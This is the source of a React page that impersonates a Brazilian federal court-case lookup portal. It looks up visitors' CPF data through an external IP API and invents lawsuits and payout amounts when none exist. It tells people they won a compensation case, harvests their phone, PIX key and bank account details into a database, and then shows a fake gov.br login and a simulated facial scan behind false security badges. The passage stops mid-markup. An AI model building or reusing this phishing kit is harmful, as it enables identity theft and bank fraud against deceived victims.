"use client"

import type React from "react"

import { useState, useEffect, useRef } from "react"
import { motion } from "framer-motion"
import {
  Search,
  CheckCircle,
  Clock,
  Shield,
  CreditCard,
  QrCode,
  Cloud,
  HelpCircle,
  FileText,
  Phone,
  Check,
  Info,
  Bell,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Accordion, AccordionContent, AccordionItem, AccordionTrigger } from "@/components/ui/accordion"
import { createClient } from "@/lib/supabase/client"
import { LogoutButton } from "@/components/auth/logout-button"

interface LeadData {
  cpf: string
  nome?: string
  data_nascimento?: string
  nome_mae?: string
  numero_processo?: string
  empresa?: string
  telefone?: string
  tipo_chave_pix?: string
  chave_pix?: string
  banco?: string
  agencia?: string
  conta?: string
  ip_address?: string
  user_agent?: string
  valor_causa?: string
}

interface AccessibilitySettings {
  highContrast: boolean
  largeText: boolean
  reducedMotion: boolean
  vlibrasActive: boolean
}

const empresas = [
  "Banco do Brasil S.A.",
  "Caixa Econômica Federal",
  "Banco Bradesco S.A.",
  "Banco Santander (Brasil) S.A.",
  "Banco Itaú Unibanco S.A.",
  "Banco BTG Pactual S.A.",
  "Banco Safra S.A.",
  "Banco Votorantim S.A.",
  "Banco Original S.A.",
  "Banco Inter S.A.",
  "Nubank S.A.",
  "Banco C6 S.A.",
  "Banco Next S.A.",
  "Banco Neon S.A.",
  "Banco PagSeguro S.A.",
  "Banco Stone S.A.",
  "Banco Modal S.A.",
  "Banco XP S.A.",
  "Banco Daycoval S.A.",
  "Banco Pine S.A.",
  "Banco Sofisa S.A.",
  "Banco BMG S.A.",
  "Banco Pan S.A.",
  "Banco Mercantil do Brasil S.A.",
  "Banco Cooperativo Sicredi S.A.",
  "Banco Cooperativo do Brasil S.A.",
  "Banco Regional de Desenvolvimento do Extremo Sul",
  "Banco da Amazônia S.A.",
  "Banco do Nordeste do Brasil S.A.",
  "Banco de Brasília S.A.",
  "Banco do Estado do Rio Grande do Sul S.A.",
  "Banco do Estado de Sergipe S.A.",
  "Banco Fibra S.A.",
  "Banco Alfa S.A.",
  "Banco Rendimento S.A.",
]

const nomes = [
  "João Silva",
  "Maria Souza",
  "José Santos",
  "Ana Pereira",
  "Carlos Oliveira",
  "Sofia Almeida",
  "Pedro Rodrigues",
  "Beatriz Costa",
  "Lucas Fernandes",
  "Mariana Gonçalves",
  "Gabriel Martins",
  "Laura Carvalho",
  "Guilherme Ribeiro",
  "Isabela Barbosa",
  "Rafael Castro",
  "Juliana Dias",
  "Matheus Azevedo",
  "Carolina Rocha",
  "Thiago Siqueira",
  "Amanda Campos",
]

const nomesMae = [
  "Maria da Silva",
  "Ana Souza",
  "Francisca Santos",
  "Antônia Pereira",
  "Adriana Oliveira",
  "Juliana Almeida",
  "Márcia Rodrigues",
  "Fernanda Costa",
  "Patrícia Fernandes",
  "Cristina Gonçalves",
  "Daniela Martins",
  "Renata Carvalho",
  "Vanessa Ribeiro",
  "Camila Barbosa",
  "Aline Castro",
  "Bianca Dias",
  "Cláudia Azevedo",
  "Elaine Rocha",
  "Gisele Siqueira",
  "Helena Campos",
]

// === NOVO: parser para unificar o payload da API de CPF ===
function parseCpfPayload(data: any) {
  // Novo formato suportado pela sua API
  if (data?.resultado?.DADOS?.length) {
    const it = data.resultado.DADOS[0]
    return {
      nome: it.NOME,
      data_nascimento: it.NASC,
      nome_mae: it.NOME_MAE,
      cpf: it.CPF,
    }
  }
  // Fallback p/ formatos antigos
  return data?.result || data || null
}

const gerarDataNascimento = () => {
  const ano = Math.floor(Math.random() * (2003 - 1950 + 1)) + 1950
  const mes = String(Math.floor(Math.random() * 12) + 1).padStart(2, "0")
  const dia = String(Math.floor(Math.random() * 28) + 1).padStart(2, "0")
  return `${dia}/${mes}/${ano}`
}

const buscarProcessosSupabase = async (cpfLimpo: string) => {
  try {
    console.log("[v0] SUPABASE_URL:", process.env.NEXT_PUBLIC_SUPABASE_URL)
    console.log("[v0] SUPABASE_KEY exists:", !!process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY)

    const supabase = createClient()

    console.log("[v0] Buscando processos no Supabase para CPF:", cpfLimpo)

    const cpfFormatado = cpfLimpo.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")

    const { data, error } = await supabase
      .from("processos_encontrados")
      .select("numero_processo, polo_passivo, valor_causa")
      .or(`cpf_ativo.eq.${cpfLimpo},cpf_ativo.eq.${cpfFormatado}`)

    if (error) {
      console.error("[v0] Erro ao buscar processos:", error.message)
      console.error("[v0] Erro completo:", error)
      return null
    }

    console.log("[v0] Processos encontrados no Supabase:", data)

    if (data && data.length > 0) {
      // Retorna o primeiro processo encontrado no formato esperado
      return {
        processNumber: data[0].numero_processo,
        company: data[0].polo_passivo,
        "Valor Da Causa": data[0].valor_causa,
      }
    }

    return null
  } catch (error) {
    console.error("[v0] Erro ao buscar processos no Supabase:", error)
    console.error("[v0] Tipo do erro:", typeof error)
    return null
  }
}

// Mock data for processosData
// const processosData = {
//   byCpf: {
//     "123.456.789-01": [
//       {
//         processNumber: "1234567-89.2023.8.13.0001",
//         company: "Empresa A",
//         "Valor Da Causa": "R$ 10.000,00",
//       },
//     ],
//     "987.654.321-09": [
//       {
//         processNumber: "9876543-21.2022.8.13.0002",
//         company: "Empresa B",
//         "Valor Da Causa": "R$ 20.000,00",
//       },
//     ],
//   },
// }

const salvarDadosSupabase = async (leadData: LeadData) => {
  try {
    const supabase = createClient()

    console.log("[v0] Iniciando salvamento dos dados no Supabase:", leadData)

    const consultaData = {
      cpf: leadData.cpf,
      nome_completo: leadData.nome,
      data_nascimento: leadData.data_nascimento,
      nome_mae: leadData.nome_mae,
      numero_processo: leadData.numero_processo,
      empresa_processo: leadData.empresa, // Correct column name
      valor_disponivel: leadData.valor_causa, // Correct column name
      telefone: leadData.telefone || null,
      tipo_chave_pix: leadData.tipo_chave_pix || null,
      chave_pix: leadData.chave_pix || null,
      banco: leadData.banco || null,
      agencia: leadData.agencia || null,
      conta: leadData.conta || null,
      status: "iniciado",
      ip_address: null, // Could be populated with actual IP if needed
      user_agent: typeof window !== "undefined" ? window.navigator.userAgent : null,
    }

    const { data, error } = await supabase.from("consultas_processuais").insert([consultaData])

    if (error) {
      console.error("[v0] Erro ao salvar dados no Supabase:", error)
      return false
    }

    console.log("[v0] Dados salvos com sucesso no Supabase:", data)
    return true
  } catch (error) {
    console.error("[v0] Erro ao salvar dados no Supabase:", error)
    return false
  }
}

export default function ConsultaProcessual() {
  const [currentPage, setCurrentPage] = useState<
    "initial" | "resultado" | "bancario" | "govbr-login" | "facial-scan" | "facial-identified" | "success"
  >("initial")
  const [cpf, setCpf] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [user, setUser] = useState<any>(null)
  const [isLoadingAuth, setIsLoadingAuth] = useState(true)
  const supabase = createClient()

  useEffect(() => {
    const checkAuth = async () => {
      const {
        data: { user },
      } = await supabase.auth.getUser()
      setUser(user)
      setIsLoadingAuth(false)
    }

    checkAuth()

    const {
      data: { subscription },
    } = supabase.auth.onAuthStateChange((event, session) => {
      setUser(session?.user ?? null)
    })

    return () => subscription.unsubscribe()
  }, [supabase.auth])

  const [telefone, setTelefone] = useState("")
  const [tipoChavePix, setTipoChavePix] = useState("")
  const [chavePix, setChavePix] = useState("")
  const [banco, setBanco] = useState("")
  const [agencia, setAgencia] = useState("")
  const [conta, setConta] = useState("")
  const [showBankList, setShowBankList] = useState(false)
  const [bankFilter, setBankFilter] = useState("")
  const [cpfData, setCpfData] = useState<any>(null)
  const [isLoadingCpf, setIsLoadingCpf] = useState(false)
  const [processData, setProcessData] = useState<any>(null)
  const [leadData, setLeadData] = useState<LeadData>({} as LeadData)
  const [showLibrasModal, setShowLibrasModal] = useState(false)
  const [accessibilitySettings, setAccessibilitySettings] = useState<AccessibilitySettings>({
    highContrast: false,
    largeText: false,
    reducedMotion: false,
    vlibrasActive: false,
  })

  const videoRef = useRef<HTMLVideoElement>(null)
  const [cameraStream, setCameraStream] = useState<MediaStream | null>(null)

  const [bancosFiltrados, setBancosFiltrados] = useState<string[]>([])
  const [mostrarSugestoes, setMostrarSugestoes] = useState(false)

  const formatarCPF = (cpf: string) => {
    const cpfFormatado = cpf.replace(/\D/g, "").replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")
    const cpfNumeros = cpf.replace(/\D/g, "")

    // Chama a API quando o CPF estiver completo (11 dígitos)
    if (cpfNumeros.length === 11) {
      buscarDadosCPF(cpfNumeros)
    }

    return cpfFormatado
  }

  const formatarTelefone = (telefone: string) => {
    return telefone.replace(/\D/g, "").replace(/(\d{2})(\d{5})(\d{4})/, "($1) $2-$3")
  }

  const gerarNumeroProcesso = () => {
    const sequencial = Math.floor(Math.random() * 9000000) + 1000000
    const ano = new Date().getFullYear()
    const tribunal = "8.13"
    const origem = String(Math.floor(Math.random() * 9000) + 1000).padStart(4, "0")
    return `${sequencial}-${Math.floor(Math.random() * 90) + 10}.${ano}.${tribunal}.${origem}`
  }

  const formatCpf = (value: string) => {
    const numbers = value.replace(/\D/g, "")
    return numbers.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")
  }

  const formatPhone = (value: string) => {
    const numbers = value.replace(/\D/g, "")
    if (numbers.length <= 10) {
      return numbers.replace(/(\d{2})(\d{4})(\d{4})/, "($1) $2-$3")
    }
    return numbers.replace(/(\d{2})(\d{5})(\d{4})/, "($1) $2-$3")
  }

  const handleCpfChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCpf(e.target.value)
    if (formatted.length <= 14) {
      setCpf(formatted)
    }
  }

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatPhone(e.target.value)
    if (formatted.length <= 15) {
      setTelefone(formatted)
    }
  }

  const buscarDadosCPF = async (cpfNumeros: string) => {
    if (cpfNumeros.length !== 11) return

    setIsLoadingCpf(true)
    try {
      const cpfParam = cpfNumeros.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4") // API espera formatado
      const response = await fetch(`http://38.242.137.71:3000/api/cpf/${cpfParam}`)
      if (response.ok) {
        const raw = await response.json()
        const parsed = parseCpfPayload(raw)
        setCpfData(parsed)
        console.log("[v0] Dados do CPF recebidos:", parsed)
      }

      console.log("[v0] CPF limpo para busca:", cpfNumeros)

      const processoEncontrado = await buscarProcessosSupabase(cpfNumeros)
      console.log("[v0] Processo encontrado no Supabase:", processoEncontrado)

      if (processoEncontrado) {
        setProcessData(processoEncontrado)
        console.log("[v0] Dados do processo definidos:", processoEncontrado)
      } else {
        setProcessData(null)
        console.log("[v0] Nenhum processo encontrado para o CPF no Supabase")
      }
    } catch (error) {
      console.error("[v0] Erro ao buscar CPF:", error)
    } finally {
      setIsLoadingCpf(false)
    }
  }

  const iniciarFluxo = async () => {
    const cpfLimpo = cpf.replace(/\D/g, "")

    if (cpfLimpo.length !== 11) {
      alert("Por favor, digite um CPF válido com 11 dígitos.")
      return
    }

    try {
      setIsLoadingCpf(true)
      const cpfParam = cpfLimpo.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")
      const response = await fetch(`http://38.242.137.71:3000/api/cpf/${cpfParam}`)
      let dadosApi = null
      
      if (response.ok) {
        const raw = await response.json()
        dadosApi = parseCpfPayload(raw)
        console.log("[v0] Dados da API obtidos diretamente:", dadosApi)
      }      
	  
     const dadosConsulta: any = {}
     
     if (dadosApi && dadosApi.nome) {
       console.log("[v0] Usando dados reais da API:", dadosApi)
       dadosConsulta.nome = dadosApi.nome
       dadosConsulta.data_nascimento = dadosApi.data_nascimento
       dadosConsulta.nome_mae = dadosApi.nome_mae
     } else {
        console.log("[v0] Dados da API não disponíveis, usando dados simulados")
        const nomeAleatorio = nomes[Math.floor(Math.random() * nomes.length)]
        const dataAleatoria = gerarDataNascimento()
        const nomeMaeAleatorio = nomesMae[Math.floor(Math.random() * nomesMae.length)]

        dadosConsulta.nome = nomeAleatorio
        dadosConsulta.data_nascimento = dataAleatoria
        dadosConsulta.nome_mae = nomeMaeAleatorio
      }

      console.log("[v0] CPF limpo:", cpfLimpo)

      const processoEncontrado = await buscarProcessosSupabase(cpfLimpo)
      console.log("[v0] Processo encontrado no Supabase:", processoEncontrado)

      if (processoEncontrado) {
        console.log("[v0] Usando dados reais do processo:", processoEncontrado)
        dadosConsulta.numero_processo = processoEncontrado.processNumber
        dadosConsulta.empresa = processoEncontrado.company
        dadosConsulta.valor_causa = processoEncontrado["Valor Da Causa"]
      } else {
        console.log("[v0] CPF não encontrado no Supabase. Usando dados simulados do processo")
        const empresaAleatoria = empresas[Math.floor(Math.random() * empresas.length)]
        const numeroProcesso = gerarNumeroProcesso()
        dadosConsulta.numero_processo = numeroProcesso
        dadosConsulta.empresa = empresaAleatoria
        dadosConsulta.valor_causa = `R$ ${(Math.random() * 50000 + 10000).toLocaleString("pt-BR", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`
      }

      const cpfFormatado = cpfLimpo.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")
      dadosConsulta.cpf = cpfFormatado

      // Dados ficam apenas em estado local até o final
      console.log("[v0] Dados da consulta capturados (não salvos ainda):", dadosConsulta)

      setLeadData({ ...leadData, ...dadosConsulta })
      setCurrentPage("resultado")
    } catch (error) {
      console.error("[v0] Erro no fluxo:", error)
    } finally {
      setIsLoadingCpf(false)
    }
  }

const handleConsultarClick = async () => {
  if (!cpf) return

  const cpfLimpo = cpf.replace(/\D/g, "")
  if (cpfLimpo.length !== 11) {
    alert("CPF deve ter 11 dígitos")
    return
  }

  setIsLoading(true)

  try {
    let dadosApiCpf: any = null

    // 1) Buscar na API (CPF formatado)
    const cpfParam = cpfLimpo.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")
    const response = await fetch(`http://38.242.137.71:3000/api/cpf/${cpfParam}`)
    if (response.ok) {
      const raw = await response.json()
      dadosApiCpf = parseCpfPayload(raw)
      console.log("[v0] Dados da API obtidos diretamente:", dadosApiCpf)
    }

    // 2) (apenas efeito visual)
    await new Promise((resolve) => setTimeout(resolve, 1500))

    // 3) Montar dados da consulta (usa real -> senão fallback)
    let dadosConsulta: any = {}
    if (dadosApiCpf && (dadosApiCpf.nome || dadosApiCpf.data_nascimento || dadosApiCpf.nome_mae)) {
      console.log("[v0] Usando dados reais da API:", dadosApiCpf)
      dadosConsulta = {
        nome: dadosApiCpf.nome || "Nome não encontrado",
        data_nascimento: dadosApiCpf.data_nascimento || "Data não encontrada",
        nome_mae: dadosApiCpf.nome_mae || "Nome da mãe não encontrado",
      }
    } else {
      console.log("[v0] Usando dados simulados - API não disponível")
      dadosConsulta = {
        nome: "João Silva Santos",
        data_nascimento: "15/03/1985",
        nome_mae: "Maria Santos Silva",
      }
    }

    // 4) Buscar processo no Supabase
    const cpfFormatado = cpfLimpo.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")
    console.log("[v0] CPF digitado:", cpf)
    console.log("[v0] CPF limpo:", cpfLimpo)
    console.log("[v0] CPF formatado para busca:", cpfFormatado)

    const processoEncontrado = await buscarProcessosSupabase(cpfLimpo)
    console.log("[v0] Processo encontrado no Supabase:", processoEncontrado)

    if (processoEncontrado) {
      console.log("[v0] Usando dados reais do processo:", processoEncontrado)
      dadosConsulta.numero_processo = processoEncontrado.processNumber
      dadosConsulta.empresa = processoEncontrado.company
      dadosConsulta.valor_causa = processoEncontrado["Valor Da Causa"]
    } else {
      console.log("[v0] CPF não encontrado no Supabase. Usando dados simulados do processo")
      const empresaAleatoria = empresas[Math.floor(Math.random() * empresas.length)]
      const numeroProcesso = gerarNumeroProcesso()
      dadosConsulta.numero_processo = numeroProcesso
      dadosConsulta.empresa = empresaAleatoria
      dadosConsulta.valor_causa = `R$ ${(Math.random() * 50000 + 10000).toLocaleString("pt-BR", { minimumFractionDigits: 2 })}`
    }

    dadosConsulta.cpf = cpfFormatado

    // 5) Atualizar estado e ir para a próxima tela
    console.log("[v0] Dados da consulta capturados (não salvos ainda):", dadosConsulta)
    setLeadData((prev) => ({ ...prev, ...dadosConsulta }))
    setCurrentPage("resultado")
  } catch (error) {
    console.error("Erro na consulta:", error)
    alert("Erro ao realizar consulta. Tente novamente.")
  } finally {
    setIsLoading(false)
  }
}

  const goToBancario = () => {
    setCurrentPage("bancario")
  }

  const goToGovLogin = async () => {
    try {
      const dadosConsulta: any = {
        nome: leadData.nome,
        data_nascimento: leadData.data_nascimento, // Preserve from initial capture
        nome_mae: leadData.nome_mae,
        numero_processo: leadData.numero_processo,
        empresa: leadData.empresa,
        valor_causa: leadData.valor_causa,
        cpf: leadData.cpf,
      }

      // Capturar todos os dados preenchidos
      const dadosCompletos = {
        ...leadData,
        telefone,
        tipo_chave_pix: tipoChavePix,
        chave_pix: chavePix,
        banco,
        agencia,
        conta,
        status: "dados_bancarios_preenchidos",
        ...dadosConsulta,
      }

      console.log("[v0] Salvando dados bancários completos:", dadosCompletos)

      await salvarDadosSupabase(dadosCompletos)
      console.log("[v0] Todos os dados bancários salvos no Supabase com sucesso")

      // Atualizar leadData com todos os dados
      setLeadData(dadosCompletos)

      setCurrentPage("govbr-login")
    } catch (error) {
      console.error("[v0] Erro ao processar dados:", error)
      setCurrentPage("govbr-login")
    }
  }

  const goToFacialScan = async () => {
    setIsLoading(true)
    setTimeout(async () => {
      setIsLoading(false)
      setCurrentPage("facial-scan")

      // Ativar câmera
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: {
            width: { ideal: 640 },
            height: { ideal: 480 },
            facingMode: "user",
          },
        })
        setCameraStream(stream)
        if (videoRef.current) {
          videoRef.current.srcObject = stream
        }

        // Simular reconhecimento facial após 5 segundos
        setTimeout(() => {
          goToFacialIdentified()
        }, 5000)
      } catch (err) {
        console.error("Erro ao acessar a câmera: ", err)
        alert("Não foi possível acessar a câmera. Verifique as permissões e tente novamente.")
        setCurrentPage("govbr-login")
      }
    }, 2000)
  }

  const goToFacialIdentified = () => {
    if (cameraStream) {
      cameraStream.getTracks().forEach((track) => track.stop())
      setCameraStream(null)
    }

    setIsLoading(true)
    setTimeout(() => {
      setIsLoading(false)
      setCurrentPage("facial-identified")

      // Ir para página de sucesso após 3 segundos
      setTimeout(() => {
        setCurrentPage("success")
      }, 3000)
    }, 2000)
  }

  const toggleLibrasModal = () => {
    setShowLibrasModal(!showLibrasModal)
  }

  const toggleHighContrast = () => {
    setAccessibilitySettings((prev) => ({
      ...prev,
      highContrast: !prev.highContrast,
    }))
  }

  const toggleLargeText = () => {
    setAccessibilitySettings((prev) => ({
      ...prev,
      largeText: !prev.largeText,
    }))
  }

  const toggleReducedMotion = () => {
    setAccessibilitySettings((prev) => ({
      ...prev,
      reducedMotion: !prev.reducedMotion,
    }))
  }

  const toggleVLibras = () => {
    setAccessibilitySettings((prev) => ({
      ...prev,
      vlibrasActive: !prev.vlibrasActive,
    }))
  }

  useEffect(() => {
    const body = document.body

    if (accessibilitySettings.highContrast) {
      body.classList.add("high-contrast")
    } else {
      body.classList.remove("high-contrast")
    }

    if (accessibilitySettings.largeText) {
      body.classList.add("large-text")
    } else {
      body.classList.remove("large-text")
    }

    if (accessibilitySettings.reducedMotion) {
      body.classList.add("reduced-motion")
    } else {
      body.classList.remove("reduced-motion")
    }
  }, [accessibilitySettings])

  const filtrarBancos = (valor: string) => {
    if (valor.length < 2) {
      setBancosFiltrados([])
      setMostrarSugestoes(false)
      return
    }

    const filtrados = empresas.filter((banco) => banco.toLowerCase().includes(valor.toLowerCase()))
    setBancosFiltrados(filtrados)
    setMostrarSugestoes(filtrados.length > 0)
  }

  const selecionarBanco = (bancoSelecionado: string) => {
    setBanco(bancoSelecionado)
    setMostrarSugestoes(false)
    setBancosFiltrados([])
  }

  const mostrarTodosBancos = () => {
    setBancosFiltrados(empresas)
    setMostrarSugestoes(true)
  }

  const renderCurrentPage = () => {
    if (isLoading) {
      return (
        <div className="fixed inset-0 bg-white bg-opacity-95 backdrop-blur-sm flex flex-col items-center justify-center z-50">
          <div className="card-gov text-center max-w-md">
            <div className="loading-spinner mx-auto mb-6"></div>
            <h3 className="text-xl font-semibold text-gov-blue mb-2">Processando...</h3>
            <p className="text-gov-gray mb-4">Conectando com sistemas oficiais do governo</p>
            <div className="flex items-center justify-center space-x-4 text-sm text-gov-gray">
              <div className="flex items-center">
                <Shield className="h-4 w-4 text-gov-green mr-1" />
                <span>Seguro</span>
              </div>
              <div className="flex items-center">
                <Shield className="h-4 w-4 text-gov-blue mr-1" />
                <span>Criptografado</span>
              </div>
              <div className="flex items-center">
                <Shield className="h-4 w-4 text-gov-gold mr-1" />
                <span>Oficial</span>
              </div>
            </div>
          </div>
        </div>
      )
    }

    switch (currentPage) {
      case "resultado":
        return renderResultadoPage()
      case "bancario":
        return renderBancarioPage()
      case "govbr-login":
        return renderGovbrLoginPage()
      case "facial-scan":
        return renderFacialScanPage()
      case "facial-identified":
        return renderFacialIdentifiedPage()
      case "success":
        return renderSuccessPage()
      default:
        return renderInitialPage()
    }
  }

  const renderInitialPage = () => (
    <main className="min-h-screen bg-gray-50">
      {user && (
        <div className="bg-white border-b border-gray-200">
          <div className="container mx-auto px-4 py-2 flex justify-between items-center">
            <span className="text-sm text-gray-600">
              Logado como: <strong>{user.email}</strong>
            </span>
            <LogoutButton />
          </div>
        </div>
      )}

      {/* Seção Principal */}
      <div className="bg-gray-50 py-16">
        <div className="container mx-auto px-4 max-w-4xl">
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.6 }}
            className="text-center mb-12"
          >
            <h1 className="text-4xl md:text-5xl font-bold text-blue-600 mb-6">Consulta Processual</h1>
            <p className="text-lg text-gray-600 max-w-3xl mx-auto leading-relaxed">
              Consulte processos por CPF, CNPJ, nome ou número do processo de forma rápida
              <br />e segura através do portal oficial do Governo Federal
            </p>
          </motion.div>

          {/* Campo de Busca Central */}
          <motion.div
            initial={{ opacity: 0, y: 30 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.6, delay: 0.2 }}
            className="max-w-2xl mx-auto mb-8"
          >
            <div className="bg-white rounded-xl shadow-lg border border-gray-100 p-6">
              <div className="flex flex-col md:flex-row gap-3">
                <Input
                  type="text"
                  placeholder="Digite um CPF (000.000.000-00)"
                  value={cpf}
                  onChange={(e) => setCpf(formatarCPF(e.target.value))}
                  className={`flex-1 h-11 text-base border-gray-200 rounded-lg focus:border-blue-400 focus:ring-1 focus:ring-blue-400 placeholder:text-gray-400 ${
                    isLoadingCpf ? "bg-blue-50" : ""
                  }`}
                  maxLength={14}
                />
                <Button
                  onClick={handleConsultarClick}
                  disabled={isLoading || cpf.length < 14}
                  className="bg-blue-600 hover:bg-blue-700 text-white px-6 h-11 text-base font-medium rounded-lg transition-colors"
                >
                  {isLoading ? (
                    <div className="flex items-center">
                      <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white mr-2"></div>
                      Processando...
                    </div>
                  ) : (
                    <>
                      <Search className="h-4 w-4 mr-2" />
                      Consultar CPF
                    </>
                  )}
                </Button>
              </div>

              {/* Indicadores de Segurança */}
              <div className="mt-5 flex items-center justify-center space-x-8 text-sm">
                <div className="flex items-center text-gray-500">
                  <i className="fas fa-shield-alt text-green-500 mr-2 text-xs"></i>
                  <span>100% Seguro</span>
                </div>
                <div className="flex items-center text-gray-500">
                  <i className="fas fa-clock text-blue-500 mr-2 text-xs"></i>
                  <span>Consulta Instantânea</span>
                </div>
                <div className="flex items-center text-gray-500">
                  <i className="fas fa-eye-slash text-gray-500 mr-2 text-xs"></i>
                  <span>Totalmente Sigiloso</span>
                </div>
              </div>
            </div>
          </motion.div>
        </div>
      </div>

      {/* Seção Como Funciona */}
      <div className="bg-white py-16">
        <div className="container mx-auto px-4 max-w-6xl">
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.6, delay: 0.4 }}
            className="text-center mb-12"
          >
            <h2 className="text-3xl font-bold text-blue-600 mb-8">Como funciona nossa consulta?</h2>
          </motion.div>

          <div className="grid md:grid-cols-3 gap-8">
            {[
              {
                icon: Search,
                title: "Busca Otimizada",
                description:
                  "Encontre processos pelo CPF, nome ou número utilizando nossa plataforma integrada aos principais tribunais do país",
              },
              {
                icon: FileText,
                title: "Informações Completas",
                description:
                  "Acesse todas as movimentações, documentos e informações detalhadas do processo de forma organizada",
              },
              {
                icon: Bell,
                title: "Atualizações em Tempo Real",
                description:
                  "Receba notificações automáticas sobre qualquer movimentação ou atualização em seus processos",
              },
            ].map((feature, index) => (
              <motion.div
                key={index}
                initial={{ opacity: 0, y: 30 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ duration: 0.6, delay: 0.6 + index * 0.1 }}
                className="bg-white border border-gray-200 rounded-lg p-8 text-center hover:shadow-md transition-shadow"
              >
                <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-6">
                  <feature.icon className="h-8 w-8 text-blue-600" />
                </div>
                <h3 className="text-xl font-semibold text-blue-600 mb-4">{feature.title}</h3>
                <p className="text-gray-600 leading-relaxed">{feature.description}</p>
              </motion.div>
            ))}
          </div>
        </div>
      </div>

      {/* Seção FAQ */}
      <div className="bg-gray-50 py-16">
        <div className="container mx-auto px-4 max-w-4xl">
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.6, delay: 0.8 }}
            className="text-center mb-12"
          >
            <h2 className="text-3xl font-bold text-blue-600">Perguntas Frequentes</h2>
          </motion.div>

          <motion.div
            initial={{ opacity: 0, y: 30 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.6, delay: 1.0 }}
          >
            <Accordion type="single" collapsible className="space-y-4">
              {[
                {
                  question: "Como consultar um processo?",
                  answer:
                    "Digite seu CPF, CNPJ, nome ou número do processo na barra de busca acima. Nossa plataforma irá buscar em todos os tribunais integrados.",
                },
                {
                  question: "Quais processos posso consultar?",
                  answer:
                    "Todos os processos públicos disponíveis nos tribunais integrados ao sistema, incluindo TRFs, TJs e tribunais superiores.",
                },
                {
                  question: "As partes ficam sabendo da pesquisa?",
                  answer:
                    "Não. A pesquisa é 100% sigilosa e segura. Nenhuma das partes envolvidas no processo será notificada sobre a consulta.",
                },
                {
                  question: "Em quais tribunais posso consultar?",
                  answer:
                    "Consultamos dados nos principais Tribunais Regionais Federais, Tribunais de Justiça estaduais e tribunais superiores do país.",
                },
              ].map((faq, index) => (
                <AccordionItem
                  key={index}
                  value={`item-${index}`}
                  className="bg-white border border-gray-200 rounded-lg px-6"
                >
                  <AccordionTrigger className="text-left font-semibold text-blue-600 hover:no-underline py-6">
                    {faq.question}
                  </AccordionTrigger>
                  <AccordionContent className="text-gray-600 pb-6">{faq.answer}</AccordionContent>
                </AccordionItem>
              ))}
            </Accordion>
          </motion.div>
        </div>
      </div>

      {/* Adicionando indicador de carregamento dos dados do CPF */}
      {isLoadingCpf && (
        <div className="text-center mt-2">
          <span className="text-sm text-blue-600">
            <i className="fas fa-spinner fa-spin mr-2"></i>
            Buscando dados do CPF...
          </span>
        </div>
      )}

      {cpfData && Object.keys(cpfData).length > 0 && (
        <div className="text-center mt-2">
          <span className="text-sm text-green-600">
            <i className="fas fa-check-circle mr-2"></i>
            CPF encontrado! Dados carregados.
          </span>
        </div>
      )}

      {/* Adicionando indicador quando processo é encontrado */}
      {processData && (
        <div className="text-center mt-2">
          <span className="text-sm text-green-600">
            <i className="fas fa-gavel mr-2"></i>
            Processo localizado! Dados carregados.
          </span>
        </div>
      )}
    </main>
  )

  const renderResultadoPage = () => (
    <main className="container mx-auto px-4 py-8 max-w-4xl">
      <div className="card-gov">
        <div className="flex items-center mb-6">
          <div className="w-12 h-12 bg-gov-green rounded-full flex items-center justify-center mr-4">
            <Check className="h-6 w-6 text-white" />
          </div>
          <div>
            <h2 className="text-2xl font-bold text-gov-blue">Processo Localizado</h2>
            <p className="text-gov-gray">Encontramos informações sobre o CPF consultado</p>
          </div>
        </div>

        <div className="grid md:grid-cols-2 gap-6 mb-6">
          <div className="space-y-4">
            <div>
              <label className="text-sm font-semibold text-gov-gray uppercase tracking-wide">Nome Completo</label>
              <p className="text-lg font-semibold text-gov-blue">{leadData.nome}</p>
            </div>
            <div>
              <label className="text-sm font-semibold text-gov-gray uppercase tracking-wide">Data de Nascimento</label>
              <p className="text-lg font-semibold text-gov-blue">{leadData.data_nascimento}</p>
            </div>
            <div>
              <label className="text-sm font-semibold text-gov-gray uppercase tracking-wide">Nome da Mãe</label>
              <p className="text-lg font-semibold text-gov-blue">{leadData.nome_mae}</p>
            </div>
          </div>

          <div className="bg-gov-gold bg-opacity-10 border-l-4 border-gov-gold p-4 rounded-r-lg">
            <div className="flex items-start">
              <FileText className="h-5 w-5 text-gov-gold mr-3 mt-1" />
              <div>
                <h3 className="font-semibold text-gov-blue mb-2">Processo Encontrado</h3>
                <p className="text-sm font-semibold text-gov-gray mb-1">Número do Processo:</p>
                <p className="font-mono text-gov-blue">{leadData.numero_processo}</p>
                <div className="mt-3">
                  <p className="font-semibold text-gov-blue mb-2">Processo contra {leadData.empresa}</p>
                  <p className="text-gov-gray mb-2">
                    Você <strong className="text-gov-green">ganhou a causa</strong> e tem direito a uma indenização.
                  </p>
                  <p className="text-lg font-bold text-gov-green">
                    Valor disponível:{" "}
                    {leadData.valor_causa ||
